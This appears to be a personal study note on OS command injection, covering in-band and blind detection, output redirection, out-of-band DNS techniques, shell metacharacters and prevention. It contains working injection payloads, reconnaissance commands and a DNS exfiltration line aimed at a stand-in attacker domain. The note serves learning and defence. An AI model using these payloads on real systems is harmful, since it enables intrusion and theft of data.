# OS command injection
#THEORY 
#COMMANDINJECTION

<hr>

OS command injection (shell injection) is a web security vulnerability that allows an attacker to execute arbitrary system (OS) commands in the server that is running the application, typically fully compromising the application and all its data. This can also lead an attacker to further compromise the infrastructure of the organization pivoting the attack to other systems.

## Executing arbitrary commands

Consider a shopping application that lets the user view whether an item is in stock in a particular store. This information is accessed via a URL like:

`https://insecure-website.com/stockStatus?productID=381&storeID=29`

To provide the stock information, the application must query various legacy systems. For historical reasons, the functionality is implemented by calling out to a shell command with the product and store IDs as arguments:

`stockreport.pl 381 29`

This command outputs the stock status for the specified item, which is returned to the user.

Since the application implements no defenses against OS command injection, an attacker can submit the following input to execute an arbitrary command:

`& echo aiwefwlguh &`

If this input is submitted in the `productID` parameter, then the command executed by the application is:

`stockreport.pl & echo aiwefwlguh & 29`

The `echo` command simply causes the supplied string to be echoed in the output, and is a useful way to test for some types of OS command injection. The `&` character is a shell command separator, and so what gets executed is actually three separate commands one after another. As a result, the output returned to the user is:

`Error - productID was not provided aiwefwlguh 29: command not found`

The three lines of output demonstrate that:

-   The original `stockreport.pl` command was executed without its expected arguments, and so returned an error message.
-   The injected `echo` command was executed, and the supplied string was echoed in the output.
-   The original argument `29` was executed as a command, which caused an error.

Placing the additional command separator `&` after the injected command is generally useful because it separates the injected command from whatever follows the injection point. This reduces the likelihood that what follows will prevent the injected command from executing.

### Exploitation example

[[OS command injection, simple case]]

<hr>

## Useful commands

Obtain as much information as possible form the compromised system.

Purpose of command | Linux | Windows
---------------|-------|------------
Name of current user |`whoami`|`whoami`
Operating system | `uname -a` | `ver`
Network configuration | `ifconfig` | `ipconfig /all`
Network connections | `netstat -an` | `netstat -an`
Running processes | `ps -ef` |`tasklist`

<hr>

## Blind OS command injection vulnerabilities

This occurs when the application does not return the output from the command within its HTTP response. The vulnerability can still be exploited but different techniques are applied.

An example scenario:

Consider a web site that lets users submit feedback about the site. The user enters their email address and feedback message. The server-side application then generates an email to a site administrator containing the feedback. To do this, it calls out to the `mail` program with the submitted details. For example:

`mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com`

The output from the `mail` command (if any) is not returned in the application's responses, and so using the `echo` payload would not be effective. In this situation, you can use a variety of other techniques to detect and exploit a vulnerability.

<hr>


## Detecting blind OS command injection

### Time delays

An injected command can be used to trigger a time delay, with the purpose of determining if the command was executed based on the time the application takes to respond. The `ping` command can be useful in this case, injecting a payload like:

`& ping -c 10 127.0.0.1 &`

Which will cause the application to ping its loopback interface for 10 seconds.

### Exploitation example

[[Blind OS command injection with time delays]]

### Redirecting output

Inject a command, then redirect it's output to a file, place it a location in which it can be retrieved with the browser, depending on wether the application serves static resources or not. Use a payload like:

`& whoami > /var/www/static/whoami.txt &`

(the payload above assumes that the web application uses the system location `/var/www/static` to retieve resources and also that the server runs Linux OS)

The `>` character sends the output from the `whoami` command to the specified file. You can then use the browser to fetch `https://vulnerable-website.com/whoami.txt` to retrieve the file, and view the output from the injected command.

### Exploitation example

[[Blind OS command injection with output redirection]]

<hr>

## Command injection using out-of-band (OAST) techniques

The goal is injecting a command that triggers an out-of-band network interaction with an attacker controlled system.

`& nslookup kgji2ohoyw.web-attacker.com &`

The `nslookup` command causes a DNS lookup for the specified domain. So that he attacker can confirm that the command was executed by the server.

### Data exfiltration

The out-of-band channel also provides an easy way to exfiltrate the output from injected commands:

``& nslookup `whoami`.kgji2ohoyw.web-attacker.com &``

This will cause a DNS lookup to the attacker's domain containing the result of the `whoami` command:

`wwwuser.kgji2ohoyw.web-attacker.com`

<hr>

## Ways to inject commands

Useful shell metacharacters to inject commands.

Metacharacters | Unix | Windows
---------------|-------|------------
Name of current user |[x]|[x]
`&`| [x]| [x]
`&&` |[x]|[x]
\| |[x]|[x]
\|\| |[x]|[x]
`;` |[x]|[]
`Newline (0x0a or \n)` |[x]|[]
\`injected command\`  |[x]|[]
$(injected command)  |[x]|[]

Note that the different shell metacharacters have subtly different behaviors that might affect whether they work in certain situations, and whether they allow in-band retrieval of command output or are useful only for blind exploitation.

Sometimes, the input that you control appears within quotation marks in the original command. In this situation, you need to terminate the quoted context (using `"` or `'`) before using suitable shell metacharacters to inject a new command.

<hr>

## How to prevent OS command injection attacks

By far the most effective way to prevent OS command injection vulnerabilities is to never call out to OS commands from application-layer code. In virtually every case, there are alternate ways of implementing the required functionality using safer platform APIs.

If it is considered unavoidable to call out to OS commands with user-supplied input, then strong input validation must be performed. Some examples of effective validation include:

-   Validating against a whitelist of permitted values.
-   Validating that the input is a number.
-   Validating that the input contains only alphanumeric characters, no other syntax or whitespace.

Never attempt to sanitize input by escaping shell metacharacters. In practice, this is just too error-prone and vulnerable to being bypassed by a skilled attacker.